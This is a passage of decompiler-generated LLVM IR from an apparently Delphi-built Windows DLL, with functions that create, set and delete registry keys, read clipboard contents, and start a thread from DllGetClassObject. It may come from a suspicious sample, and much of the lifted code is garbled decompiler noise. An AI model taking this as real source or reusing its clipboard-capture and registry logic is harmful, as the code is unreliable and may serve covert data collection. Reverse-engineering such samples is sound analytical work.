  %81 = load i32, i32* %80, align 4, !insn.addr !533
  %82 = icmp eq i32 %81, 0, !insn.addr !534
  %83 = icmp eq i1 %82, false, !insn.addr !535
  store i32 %81, i32* %.reg2mem, !insn.addr !535
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !535
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !535
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !535
  br i1 %83, label %dec_label_pc_404eab, label %dec_label_pc_404f19, !insn.addr !535

dec_label_pc_404f19:                              ; preds = %dec_label_pc_404f0f, %dec_label_pc_404f12.preheader, %dec_label_pc_404e92, %dec_label_pc_404e6c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !571
}

define i32 @function_404f24(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_404f24:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !572
  %2 = inttoptr i32 %1 to i32*, !insn.addr !572
  %3 = load i32, i32* %2, align 4, !insn.addr !572
  ret i32 %3, !insn.addr !573
}

define i32 @function_404f28() local_unnamed_addr {
dec_label_pc_404f28:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !574
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !574
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !574
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !575
  %2 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !576
  %3 = add i32 %2, 1, !insn.addr !576
  store i32 %3, i32* @global_var_4096a4, align 4, !insn.addr !576
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !577
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !578
  ret i32 0, !insn.addr !579
}

define i32 @function_404f4d() local_unnamed_addr {
dec_label_pc_404f4d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !580
  ret i32 %0, !insn.addr !580
}

define i32 @function_404f52() local_unnamed_addr {
dec_label_pc_404f52:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !581
}

define i32 @function_404f54(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !582
}

define i32 @function_404f58() local_unnamed_addr {
dec_label_pc_404f58:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !583
  %2 = add i32 %1, -1, !insn.addr !583
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !583
  ret i32 %0, !insn.addr !584
}

define i32 @function_404f60() local_unnamed_addr {
dec_label_pc_404f60:
  %eax.0.reg2mem = alloca i32, !insn.addr !585
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !586
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !587
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !588
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404fec, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !589
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404fec, i32 0, i32 0), i32 -2147483647), !insn.addr !590
  %2 = icmp eq i32 %1, 0, !insn.addr !591
  %3 = icmp eq i1 %2, false, !insn.addr !592
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !592
  br i1 %3, label %dec_label_pc_404fda, label %dec_label_pc_404f95, !insn.addr !592

dec_label_pc_404f95:                              ; preds = %dec_label_pc_404f60
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !593
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !594
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_405008, i32 0, i32 0), i32 -2147483647), !insn.addr !594
  %6 = icmp eq i32 %5, 0, !insn.addr !595
  %7 = icmp eq i1 %6, false, !insn.addr !596
  br i1 %7, label %dec_label_pc_404fd1, label %dec_label_pc_404fc1, !insn.addr !596

dec_label_pc_404fc1:                              ; preds = %dec_label_pc_404f95
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !597
  br label %dec_label_pc_404fd1, !insn.addr !597

dec_label_pc_404fd1:                              ; preds = %dec_label_pc_404fc1, %dec_label_pc_404f95
  %9 = call i32 @function_404374(), !insn.addr !598
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !598
  br label %dec_label_pc_404fda, !insn.addr !598

dec_label_pc_404fda:                              ; preds = %dec_label_pc_404fd1, %dec_label_pc_404f60
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !599
}

define i32 @function_404fe3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404fe3:
  %esp.1.reg2mem = alloca i32, !insn.addr !600
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !600
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !600
  %6 = inttoptr i32 %3 to i32*, !insn.addr !600
  store i32 %5, i32* %6, align 4, !insn.addr !600
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !601
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !601
  %11 = add i8 %8, %10, !insn.addr !601
  %12 = inttoptr i32 %9 to i8*, !insn.addr !601
  store i8 %11, i8* %12, align 1, !insn.addr !601
  %13 = add i32 %1, 122, !insn.addr !602
  %14 = inttoptr i32 %13 to i8*, !insn.addr !602
  %15 = load i8, i8* %14, align 1, !insn.addr !602
  %16 = udiv i32 %4, 256, !insn.addr !602
  %17 = trunc i32 %16 to i8, !insn.addr !602
  %18 = add i8 %15, %17, !insn.addr !602
  store i8 %18, i8* %14, align 1, !insn.addr !602
  %19 = load i8, i8* %7, align 4, !insn.addr !603
  %20 = load i32, i32* %eax, align 4, !insn.addr !603
  %21 = trunc i32 %20 to i8, !insn.addr !603
  %22 = add i8 %19, %21, !insn.addr !603
  %23 = icmp eq i8 %22, 0, !insn.addr !603
  %24 = inttoptr i32 %20 to i8*, !insn.addr !603
  store i8 %22, i8* %24, align 1, !insn.addr !603
  %25 = trunc i32 %3 to i16, !insn.addr !604
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !604
  br i1 %23, label %26, label %dec_label_pc_404ff1, !insn.addr !605

; <label>:26:                                     ; preds = %dec_label_pc_404fe3
  %27 = call i32 @unknown_5068(), !insn.addr !605
  br label %dec_label_pc_404ff1, !insn.addr !605

dec_label_pc_404ff1:                              ; preds = %26, %dec_label_pc_404fe3
  %28 = icmp ult i8 %22, %19, !insn.addr !603
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !606
  store i32 %29, i32* %eax, align 4, !insn.addr !606
  br i1 %28, label %dec_label_pc_405059, label %dec_label_pc_404ff4, !insn.addr !607

dec_label_pc_404ff4:                              ; preds = %dec_label_pc_404ff1
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !608, !insn.addr !603
  %31 = and i8 %30, 1, !insn.addr !603
  %32 = icmp eq i8 %31, 0, !insn.addr !603
  %33 = trunc i32 %arg4 to i16, !insn.addr !609
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !609
  %35 = inttoptr i32 %2 to i32*, !insn.addr !609
  store i32 %34, i32* %35, align 4, !insn.addr !609
  br i1 %32, label %dec_label_pc_405054, label %dec_label_pc_404ff8, !insn.addr !610

dec_label_pc_404ff8:                              ; preds = %dec_label_pc_404ff4
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !611
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !612
  %36 = add i32 %arg4, 1, !insn.addr !613
  %37 = icmp eq i32 %36, 0, !insn.addr !613
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !614
  br i1 %37, label %dec_label_pc_40505f, label %dec_label_pc_404ffe, !insn.addr !614

dec_label_pc_404ffe:                              ; preds = %dec_label_pc_404ff8
  %38 = load i32, i32* %eax, align 4, !insn.addr !615
  %39 = add i32 %38, -1, !insn.addr !615
  store i32 %39, i32* %eax, align 4, !insn.addr !615
  %40 = trunc i32 %36 to i16, !insn.addr !616
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !616
  %42 = load i32, i32* %41, align 4, !insn.addr !616
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !616
  %43 = load i32, i32* %41, align 4, !insn.addr !617
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !617
  %44 = add i32 %arg7, 105, !insn.addr !618
  %45 = inttoptr i32 %44 to i8*, !insn.addr !618
  %46 = load i8, i8* %45, align 1, !insn.addr !618
  %47 = trunc i32 %39 to i8, !insn.addr !618
  %48 = add i8 %46, %47, !insn.addr !618
  %49 = icmp ult i8 %48, %46, !insn.addr !618
  store i8 %48, i8* %45, align 1, !insn.addr !618
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !619
  br i1 %49, label %dec_label_pc_40507f, label %dec_label_pc_40500c, !insn.addr !619

dec_label_pc_40500c:                              ; preds = %dec_label_pc_404ffe
  %50 = icmp eq i8 %48, 0, !insn.addr !618
  br i1 %50, label %dec_label_pc_40502e, label %dec_label_pc_40500e, !insn.addr !620

dec_label_pc_40500e:                              ; preds = %dec_label_pc_40500c
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !621
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_40507f

dec_label_pc_40502e:                              ; preds = %dec_label_pc_40500c
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !622
  %53 = load i32, i32* %52, align 4, !insn.addr !622
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !622
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !623
  store i32 ptrtoint ([27 x i8]* @global_var_4050c4 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !624
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !625
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !626
  %55 = add i32 %arg6, -8, !insn.addr !627
  %56 = inttoptr i32 %55 to i32*, !insn.addr !627
  store i32 0, i32* %56, align 4, !insn.addr !627
  %57 = add i32 %arg6, -12, !insn.addr !628
  %58 = inttoptr i32 %57 to i32*, !insn.addr !628
  store i32 1, i32* %58, align 4, !insn.addr !628
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !629
  ret i32 %57, !insn.addr !629

dec_label_pc_405054:                              ; preds = %dec_label_pc_404ff4
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !630

dec_label_pc_405059:                              ; preds = %dec_label_pc_404ff1
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !631
  %62 = add i8 %60, %61, !insn.addr !631
  %63 = inttoptr i32 %2 to i8*, !insn.addr !631
  store i8 %62, i8* %63, align 1, !insn.addr !631
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !632
  %65 = load i8, i8* %64, align 1, !insn.addr !632
  %66 = udiv i32 %arg3, 256, !insn.addr !632
  %67 = trunc i32 %66 to i8, !insn.addr !632
  %68 = add i8 %65, %67, !insn.addr !632
  store i8 %68, i8* %64, align 1, !insn.addr !632
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !632
  br label %dec_label_pc_40505f, !insn.addr !632

dec_label_pc_40505f:                              ; preds = %dec_label_pc_405059, %dec_label_pc_404ff8
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !633
  %70 = inttoptr i32 %69 to i32*, !insn.addr !633
  store i32 0, i32* %70, align 4, !insn.addr !633
  %71 = add i32 %esp.0, -8, !insn.addr !634
  %72 = inttoptr i32 %71 to i32*, !insn.addr !634
  store i32 0, i32* %72, align 4, !insn.addr !634
  %73 = add i32 %esp.0, -12, !insn.addr !635
  %74 = inttoptr i32 %73 to i32*, !insn.addr !635
  store i32 ptrtoint ([27 x i8]* @global_var_4050c4 to i32), i32* %74, align 4, !insn.addr !635
  %75 = add i32 %esp.0, -16, !insn.addr !636
  %76 = inttoptr i32 %75 to i32*, !insn.addr !636
  store i32 -2147483647, i32* %76, align 4, !insn.addr !636
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !637
  %78 = call i32 @function_4034c8(), !insn.addr !638
  %79 = add i32 %78, 1, !insn.addr !639
  %80 = add i32 %esp.0, -20, !insn.addr !640
  %81 = inttoptr i32 %80 to i32*, !insn.addr !640
  store i32 %79, i32* %81, align 4, !insn.addr !640
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !641
  br label %dec_label_pc_40507f, !insn.addr !641

dec_label_pc_40507f:                              ; preds = %dec_label_pc_40500e, %dec_label_pc_40505f, %dec_label_pc_404ffe
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !642
  %83 = add i32 %esp.1.reload, -4, !insn.addr !643
  %84 = inttoptr i32 %83 to i32*, !insn.addr !643
  store i32 %82, i32* %84, align 4, !insn.addr !643
  %85 = add i32 %esp.1.reload, -8, !insn.addr !644
  %86 = inttoptr i32 %85 to i32*, !insn.addr !644
  store i32 1, i32* %86, align 4, !insn.addr !644
  %87 = add i32 %esp.1.reload, -12, !insn.addr !645
  %88 = inttoptr i32 %87 to i32*, !insn.addr !645
  store i32 0, i32* %88, align 4, !insn.addr !645
  %89 = add i32 %esp.1.reload, -16, !insn.addr !646
  %90 = inttoptr i32 %89 to i32*, !insn.addr !646
  store i32 ptrtoint ([10 x i8]* @global_var_4050e0 to i32), i32* %90, align 4, !insn.addr !646
  %91 = add i32 %arg6, -8, !insn.addr !647
  %92 = inttoptr i32 %91 to i32*, !insn.addr !647
  %93 = load i32, i32* %92, align 4, !insn.addr !647
  %94 = add i32 %esp.1.reload, -20, !insn.addr !648
  %95 = inttoptr i32 %94 to i32*, !insn.addr !648
  store i32 %93, i32* %95, align 4, !insn.addr !648
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !649
  %97 = load i32, i32* %92, align 4, !insn.addr !650
  %98 = add i32 %esp.1.reload, -24, !insn.addr !651
  %99 = inttoptr i32 %98 to i32*, !insn.addr !651
  store i32 %97, i32* %99, align 4, !insn.addr !651
  %100 = call i32 @function_404374(), !insn.addr !652
  %101 = load i32, i32* %99, align 4, !insn.addr !653
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !654
  store i32 4214973, i32* %90, align 4, !insn.addr !655
  %102 = call i32 @"@LStrClr"(), !insn.addr !656
  ret i32 %102, !insn.addr !657
}

define i32 @function_4050b6() local_unnamed_addr {
dec_label_pc_4050b6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !658
  ret i32 %0, !insn.addr !658
}

define i32 @function_4050bb() local_unnamed_addr {
dec_label_pc_4050bb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !659
}

define i32 @function_4050bd() local_unnamed_addr {
dec_label_pc_4050bd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !660
}

define i32 @function_4050c1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4050c1:
  %.reg2mem = alloca i32, !insn.addr !661
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !661
  %5 = inttoptr i32 %2 to i8*, !insn.addr !661
  store i8 %4, i8* %5, align 1, !insn.addr !661
  %6 = add i32 %0, 111, !insn.addr !662
  %7 = inttoptr i32 %6 to i8*, !insn.addr !662
  %8 = load i8, i8* %7, align 1, !insn.addr !662
  %9 = trunc i32 %1 to i8, !insn.addr !662
  %10 = add i8 %8, %9, !insn.addr !662
  %11 = icmp eq i8 %10, 0, !insn.addr !662
  store i8 %10, i8* %7, align 1, !insn.addr !662
  br i1 %11, label %12, label %dec_label_pc_4050c9, !insn.addr !663

; <label>:12:                                     ; preds = %dec_label_pc_4050c1
  %13 = call i32 @unknown_5140(), !insn.addr !663
  br label %dec_label_pc_4050c9, !insn.addr !663

dec_label_pc_4050c9:                              ; preds = %12, %dec_label_pc_4050c1
  %14 = icmp ult i8 %10, %8, !insn.addr !662
  br i1 %14, label %dec_label_pc_405131, label %dec_label_pc_4050cc, !insn.addr !664

dec_label_pc_4050cc:                              ; preds = %dec_label_pc_4050c9
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !608, !insn.addr !662
  %16 = and i8 %15, 1, !insn.addr !662
  %17 = icmp eq i8 %16, 0, !insn.addr !662
  %18 = trunc i32 %arg4 to i16, !insn.addr !665
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !665
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !665
  store i32 %19, i32* %20, align 4, !insn.addr !665
  br i1 %17, label %dec_label_pc_40512c, label %dec_label_pc_4050d0, !insn.addr !666

dec_label_pc_4050d0:                              ; preds = %dec_label_pc_4050cc
  %21 = add i32 %arg4, 1, !insn.addr !667
  %22 = icmp eq i32 %21, 0, !insn.addr !667
  store i32 %arg2, i32* %.reg2mem, !insn.addr !668
  br i1 %22, label %dec_label_pc_405137, label %dec_label_pc_4050d6, !insn.addr !668

dec_label_pc_4050d6:                              ; preds = %dec_label_pc_4050d0
  %23 = add i32 %arg2, -1, !insn.addr !669
  %24 = trunc i32 %21 to i16, !insn.addr !670
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !670
  %26 = load i32, i32* %25, align 4, !insn.addr !670
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !670
  %27 = load i32, i32* %25, align 4, !insn.addr !671
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !671
  %28 = add i32 %arg7, 105, !insn.addr !672
  %29 = inttoptr i32 %28 to i8*, !insn.addr !672
  %30 = load i8, i8* %29, align 1, !insn.addr !672
  %31 = trunc i32 %23 to i8, !insn.addr !672
  %32 = add i8 %30, %31, !insn.addr !672
  %33 = icmp eq i8 %32, 0, !insn.addr !672
  store i8 %32, i8* %29, align 1, !insn.addr !672
  br i1 %33, label %dec_label_pc_405106, label %dec_label_pc_4050e6, !insn.addr !673

dec_label_pc_4050e6:                              ; preds = %dec_label_pc_4050d6
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !674
  %34 = inttoptr i32 %23 to i8*, !insn.addr !675
  %35 = load i8, i8* %34, align 1, !insn.addr !675
  %36 = add i8 %35, %31, !insn.addr !675
  store i8 %36, i8* %34, align 1, !insn.addr !675
  %37 = add i32 %arg5, 86, !insn.addr !676
  %38 = inttoptr i32 %37 to i8*, !insn.addr !676
  %39 = load i8, i8* %38, align 1, !insn.addr !676
  %40 = trunc i32 %21 to i8, !insn.addr !676
  %41 = add i8 %39, %40, !insn.addr !676
  store i8 %41, i8* %38, align 1, !insn.addr !676
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !677
  %42 = call i32 @"@LStrClr"(), !insn.addr !678
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !679
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !680
  %44 = zext i1 %43 to i32, !insn.addr !681
  ret i32 %44, !insn.addr !681

dec_label_pc_405106:                              ; preds = %dec_label_pc_4050d6
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !682
  %46 = inttoptr i32 %45 to i8*, !insn.addr !682
  %47 = load i8, i8* %46, align 2, !insn.addr !682
  %48 = mul i8 %47, 2, !insn.addr !682
  store i8 %48, i8* %46, align 2, !insn.addr !682
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !683
  %50 = icmp eq i32* %49, null, !insn.addr !684
  br i1 %50, label %dec_label_pc_405131, label %dec_label_pc_405116, !insn.addr !685

dec_label_pc_405116:                              ; preds = %dec_label_pc_405106
  %51 = ptrtoint i32* %49 to i32, !insn.addr !683
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !686
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !687
  %53 = icmp eq i32* %52, null, !insn.addr !688
  br i1 %53, label %dec_label_pc_405131, label %dec_label_pc_405122, !insn.addr !689

dec_label_pc_405122:                              ; preds = %dec_label_pc_405116
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !690
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !691
  br label %dec_label_pc_40512c, !insn.addr !691

dec_label_pc_40512c:                              ; preds = %dec_label_pc_405122, %dec_label_pc_4050cc
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !692
  br label %dec_label_pc_405131, !insn.addr !692

dec_label_pc_405131:                              ; preds = %dec_label_pc_40512c, %dec_label_pc_405116, %dec_label_pc_405106, %dec_label_pc_4050c9
  %56 = call i1 @CloseClipboard(), !insn.addr !693
  %57 = sext i1 %56 to i32, !insn.addr !693
  store i32 %57, i32* %.reg2mem, !insn.addr !694
  br label %dec_label_pc_405137, !insn.addr !694

dec_label_pc_405137:                              ; preds = %dec_label_pc_4050d0, %dec_label_pc_405131
  %.reload = load i32, i32* %.reg2mem, !insn.addr !695
  ret i32 %.reload, !insn.addr !695
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_40513c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !696
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !696
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !697
  %4 = inttoptr i32 %3 to i32*, !insn.addr !698
  %5 = load i32, i32* %4, align 4, !insn.addr !698
  %6 = icmp eq i32 %5, 0, !insn.addr !698
  %7 = icmp eq i1 %6, false, !insn.addr !699
  %8 = icmp eq i1 %7, false, !insn.addr !700
  br i1 %8, label %dec_label_pc_405178, label %dec_label_pc_40514f, !insn.addr !700

dec_label_pc_40514f:                              ; preds = %dec_label_pc_40513c
  %9 = inttoptr i32 %0 to i8*, !insn.addr !701
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !702
  %11 = icmp eq i32* %10, null, !insn.addr !703
  %12 = icmp eq i1 %11, false, !insn.addr !704
  br i1 %12, label %dec_label_pc_405178, label %dec_label_pc_405162, !insn.addr !704

dec_label_pc_405162:                              ; preds = %dec_label_pc_40514f
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4222048 to i32*), i32 0, i32* null), !insn.addr !705
  br label %dec_label_pc_405178, !insn.addr !705

dec_label_pc_405178:                              ; preds = %dec_label_pc_405162, %dec_label_pc_40514f, %dec_label_pc_40513c
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !706
  store i32 0, i32* %15, align 4, !insn.addr !706
  ret i32 -2147221231, !insn.addr !707
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4051a4:
  ret i32 0, !insn.addr !708
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4051a8:
  ret i32 0, !insn.addr !709
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4051ac:
  ret i32 0, !insn.addr !710
}

define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4051b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_404f24(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !711
  ret i32 %3, !insn.addr !712
}

define i32 @function_4051fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4051fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !713
  %2 = icmp eq i1 %1, false, !insn.addr !714
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_404f24(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !715
  ret i32 %3, !insn.addr !716
}

define i32 @function_40522c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40522c:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !717
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !717
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !717
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !718
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !719
  %3 = call i32 @"@LStrPos"(), !insn.addr !720
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_405304 to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !721
  %6 = call i32 @"@LStrPos"(), !insn.addr !722
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_405304 to i32)
  %8 = call i32 @function_404f24(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !723
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !724
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !725
  ret i32 %9, !insn.addr !726
}

define i32 @function_4052c4() local_unnamed_addr {
dec_label_pc_4052c4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !727
  ret i32 %0, !insn.addr !727
}

define i32 @function_4052c9() local_unnamed_addr {
dec_label_pc_4052c9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !728
}

define i32 @function_4052cb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4052cb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !729
}

define i32 @function_4052db() local_unnamed_addr {
dec_label_pc_4052db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !730
}

define i32 @function_405328() local_unnamed_addr {
dec_label_pc_405328:
  %0 = call i32 @function_404d98(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_405398, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4053a4, i32 0, i32 0), i32 4215216), !insn.addr !731
  store i32 %0, i32* @global_var_4080fc, align 4, !insn.addr !732
  %1 = call i32 @function_404d98(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_405398, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4053c0, i32 0, i32 0), i32 4215292), !insn.addr !733
  store i32 %1, i32* @global_var_408100, align 4, !insn.addr !734
  %2 = call i32 @function_404d98(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4053d8, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_4053e4, i32 0, i32 0), i32 4215340), !insn.addr !735
  store i32 %2, i32* @global_var_408104, align 4, !insn.addr !736
  ret i32 %2, !insn.addr !737
}

